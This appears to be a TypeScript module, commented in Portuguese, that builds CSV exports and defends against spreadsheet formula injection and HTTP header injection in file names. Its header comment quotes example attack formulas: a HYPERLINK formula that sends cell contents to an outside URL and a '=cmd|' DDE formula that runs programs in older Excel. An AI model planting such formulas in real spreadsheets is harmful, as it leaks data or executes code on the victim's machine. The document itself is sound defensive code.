/**
 * Geração de CSV para planilha.
 *
 * ⚠️ **A neutralização de fórmula é regra absoluta do projeto**, não uma boa
 * prática opcional. Uma célula que começa com `=`, `+`, `-` ou `@` é
 * interpretada como fórmula pelo Excel e pelo Google Sheets **no momento em que
 * o arquivo abre** — antes de qualquer clique. Razão social existe com esses
 * caracteres, e o conteúdo vem de fonte externa.
 *
 * O ataque não é teórico: `=HYPERLINK("http://…"&A1,"clique")` numa célula
 * vaza o conteúdo da planilha para quem montou o dado, e `=cmd|'…'!A1` chega a
 * executar programa em versões antigas do Excel.
 */

/** Os caracteres que fazem uma célula virar fórmula. */
const PERIGOSOS = ["=", "+", "-", "@"];

/**
 * Caracteres de controle que o Excel também trata como início de fórmula
 * quando aparecem antes do sinal: tabulação, retorno de carro e nova linha.
 */
const CONTROLE_INICIAL = /^[\t\r\n]+/;

/**
 * Neutraliza uma célula, sem alterar o que ela diz.
 *
 * ⚠️ **Prefixa com apóstrofo em vez de apagar o caractere.** Apagar mudaria o
 * dado — e dado alterado em silêncio, numa planilha que sai como prova, é pior
 * que fórmula executada: pelo menos a fórmula é visível. O apóstrofo é a marca
 * padrão de "isto é texto" e some na exibição.
 */
export function neutralizaCelula(valor: string): string {
  const semControle = valor.replace(CONTROLE_INICIAL, "");
  if (semControle.length === 0) return valor;
  const primeiro = semControle[0] as string;
  return PERIGOSOS.includes(primeiro) ? `'${valor}` : valor;
}

/**
 * Escapa uma célula para o formato CSV, depois de neutralizá-la.
 *
 * ⚠️ A ordem importa: neutralizar **antes** de envolver em aspas. Ao contrário,
 * o apóstrofo entraria dentro das aspas de escape e a fórmula continuaria
 * ativa quando a planilha abrisse.
 */
export function celulaCsv(valor: unknown): string {
  if (valor === null || valor === undefined) return "";
  const texto = neutralizaCelula(String(valor));
  if (/[";\n\r]/.test(texto)) return `"${texto.replace(/"/g, '""')}"`;
  return texto;
}

export type Coluna<T> = { cabecalho: string; valor: (linha: T) => unknown };

/**
 * Monta o CSV inteiro.
 *
 * ⚠️ **Separador `;` e BOM no começo, por causa do Excel em português.** Com
 * vírgula, o Excel brasileiro joga a linha inteira numa célula só; sem o BOM,
 * ele lê o arquivo como se não fosse UTF-8 e "Camaçari" vira "CamaÃ§ari". As
 * duas coisas fazem a planilha chegar quebrada na mão de quem pediu — e o
 * arquivo continuaria "válido" para qualquer teste que só olhasse o conteúdo.
 */
export function montaCsv<T>(linhas: readonly T[], colunas: readonly Coluna<T>[]): string {
  const BOM = "﻿";
  const cabecalho = colunas.map((c) => celulaCsv(c.cabecalho)).join(";");
  const corpo = linhas.map((l) => colunas.map((c) => celulaCsv(c.valor(l))).join(";"));
  return BOM + [cabecalho, ...corpo].join("\r\n") + "\r\n";
}

/**
 * Nome de arquivo seguro para o cabeçalho `Content-Disposition`.
 *
 * ⚠️ Sem isto, uma razão social com aspas ou quebra de linha permitiria
 * injetar cabeçalho HTTP. O nome vem de dado externo, como todo o resto.
 */
export function nomeDeArquivoSeguro(base: string): string {
  const limpo = base
    .normalize("NFD")
    .replace(/\p{Diacritic}/gu, "")
    .replace(/[^A-Za-z0-9._-]+/g, "-")
    .replace(/-+/g, "-")
    .replace(/^-|-$/g, "")
    .slice(0, 80);
  return limpo || "exportacao";
}
